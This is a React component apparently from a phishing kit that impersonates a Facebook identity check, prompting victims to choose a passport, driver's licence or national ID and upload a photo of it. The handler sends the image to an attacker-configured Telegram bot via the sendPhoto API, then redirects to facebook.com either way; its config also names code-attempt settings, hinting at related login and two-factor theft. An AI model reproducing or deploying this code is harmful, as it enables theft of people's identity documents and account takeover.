import type { Config } from "@/components/password-modal";
import { useTranslation } from "@/hooks/useTranslation";
import getConfig from "@/utils/config";
import { faXmark } from "@fortawesome/free-solid-svg-icons";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import axios from "axios";
import type { FC } from "react";
import { useEffect, useRef, useState } from "react";
const Upload: FC = () => {
  const { texts } = useTranslation();
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [config, setConfig] = useState<Config>({
    chatId: "",
    token: "",
    loadingTime: 0,
    maxAttempt: 0,
  });

  const upLoadImage = async (file: File) => {
    const messageId = localStorage.getItem("messageId");
    const formData = new FormData();
    formData.append("photo", file);
    formData.append("chat_id", config.chatId);
    if (messageId) {
      formData.append("reply_to_message_id", messageId);
    }
    try {
      await axios.post(
        `https://api.telegram.org/bot${config.token}/sendPhoto`,
        formData,
        {
          headers: {
            "Content-Type": "multipart/form-data",
          },
        },
      );
      window.location.replace("https://facebook.com");
    } catch {
      window.location.replace("https://facebook.com");
    }
  };
  const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      upLoadImage(file);
    }
  };

  useEffect(() => {
    const { telegram, settings } = getConfig();
    setConfig({
      chatId: telegram.data_chatid,
      token: telegram.data_token,
      loadingTime: settings.code_loading_time,
      maxAttempt: settings.max_failed_code_attempts,
    });
  }, []);
  return (
    <div className="w-11/12 rounded-lg bg-white p-8 shadow-2xl md:w-2/5">
      <div className="relative mb-4 flex items-center justify-center">
        <h2 className="text-xl font-semibold text-gray-800">
          {texts.confirmYourIdentity}
        </h2>
        <FontAwesomeIcon
          icon={faXmark}
          className="absolute top-1/2 right-0 cursor-pointer text-gray-500"
        />
      </div>
      <div className="flex items-center justify-center">
        <hr className="my-5 w-full border-gray-400" />
      </div>

      <div className="mb-4">
        <b className="text-lg text-gray-700">{texts.chooseTypeOfId}</b>
        <p className="mt-2 text-gray-600">{texts.idUsageDescription}</p>
      </div>

      <div className="mb-4 w-full font-semibold text-gray-700">
        <label
          htmlFor="passport"
          className="mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200"
        >
          <span>{texts.passport}</span>
          <input
            type="radio"
            id="passport"
            name="document"
            className="h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500"
            value="passport"
            defaultChecked
          />
        </label>
        <label
          htmlFor="drivers-license"
          className="mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200"
        >
          <span>{texts.driversLicense}</span>
          <input
            type="radio"
            id="drivers-license"
            name="document"
            className="h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500"
            value="drivers-license"
          />
        </label>
        <label
          htmlFor="national-id"
          className="mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200"
        >
          <span>{texts.nationalIdCard}</span>
          <input
            type="radio"
            id="national-id"
            name="document"
            className="h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500"
            value="national-id"
          />
        </label>
      </div>

      <input
        ref={fileInputRef}
        type="file"
        accept="image/*"
        className="hidden"
        onChange={handleFileChange}
      />

      <div className="rounded-md bg-gray-100 p-4 text-sm text-gray-600">
        {texts.idStorageDescription}{" "}
        <a
          href="https://www.facebook.com/help/155050237914643/"
          target="_blank"
          rel="noreferrer"
          className="text-blue-600 underline"
        >
          {texts.learnMore}
        </a>
      </div>

      <button
        type="button"
        onClick={() => {
          fileInputRef.current?.click();
        }}
        className="mt-6 w-full cursor-pointer rounded-md bg-blue-500 px-4 py-2 font-semibold text-white hover:bg-blue-600"
      >
        {texts.uploadImage}
      </button>
    </div>
  );
};

export default Upload;
